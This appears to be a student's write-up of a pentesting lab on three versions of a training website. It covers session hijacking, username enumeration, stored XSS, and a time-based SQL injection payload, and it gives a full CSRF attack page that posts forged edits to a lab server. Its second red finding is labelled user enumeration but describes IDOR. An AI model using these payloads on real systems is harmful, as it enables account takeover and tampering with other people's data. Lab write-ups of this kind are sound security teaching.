# Project 8 - Pentesting Live Targets

Time spent: **5** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: Session Hijacking  
<img src="https://i.imgur.com/BgMbnyD.gif" />  
* The session ID is found from the chrome developer tools console. 
* The attacker changes the session ID using the provided change_session_id.php.
* The attacker is now able to access the victims session.

Vulnerability #2: SQL Injection  
<img src="https://imgur.com/Ncl5PpK.gif" />  
* The exploit exists in the salesperson.php page.
* The exploit is done via the url. 
* Using the given ```' OR SLEEP(5)=0--'``` statement, the page proceeds to wait 5 seconds before returning.


## Green

Vulnerability #1: XSS  
<img src="https://imgur.com/lqWGbzu.gif"/>
* This exploit is done via the feedback section. 
* The XSS executes when a privileged user accesses the feedback page in the /staff/feedback/ section.


Vulnerability #2: User Enumeration  
<img src="https://imgur.com/RLLQAW8.gif"/>
* Using the given username "pperson" we can see that a valid username shows a bold error.
* An incorrect username shows a not-bolded error.

## Red

Vulnerability #1: CSRF  
<img src="https://imgur.com/zvBbKDo.gif"/>
* The attacker submits a malicious webpage into the feedback section.
* The victim visits the url from the feedback.
* The malicious webpage can be customized to silently submit a form to the edit section of the victims page.
``` 
<!DOCTYPE html>
		<html>
	<head>
		<title>Your Feedback</title>
		<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
	</head>
	<body>

		<p> AYUSHYA AMITABH BACK AT IT BOIIS</p>
		<img src="https://i.kym-cdn.com/entries/icons/original/000/021/807/4d7.png" />
		<form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=7" method="POST" class="hide-form" id="attackform"  name="form">
			<input type="text" name="first_name" value="Not Marshall" /><br />
			<input type="text" name="last_name" value="Not Mathers III" /><br />
			<input type="text" name="phone" value="111-222-3333" /><br />
			<input type="text" name="email" value="gottem@exploit.com" /><br />
			<button onclick="submit()">submit</button>
		</form>
		<script>
		function submit() {
			console.log("loaded");
			window.document.forms[0].submit(function(e) {


				console.log("submitted");
			});
		}
		</script>
</html>
```

Vulnerability #2: User Enumeration  
<img src="https://imgur.com/DAgdRCk.gif"/>
* By directly changing the 'id' parameter in the URL we can find salespersons not mentioned on the page.
* ID's 10 and 11 shouldn't be accessible by everyone. 
